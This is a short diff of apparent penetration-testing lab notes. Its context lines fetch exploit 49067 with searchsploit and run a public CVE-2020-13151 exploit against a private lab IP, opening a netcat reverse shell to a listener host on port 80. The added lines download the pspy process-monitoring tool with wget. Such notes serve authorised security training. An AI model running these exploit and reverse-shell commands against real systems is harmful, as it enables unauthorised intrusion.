@@ -100,6 +100,9 @@ searchsploit -m 49067
 https://github.com/b4ny4n/CVE-2020-13151
 python3 cve2020-13151.py --ahost 192.168.193.143 --lhost 192.168.45.219 --lport 80 --netcatshell
 # note, many ports may be blocked so use one that's open such as 80 if shell not working
+
+https://github.com/DominicBreuker/pspy
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 ```
 
 .144
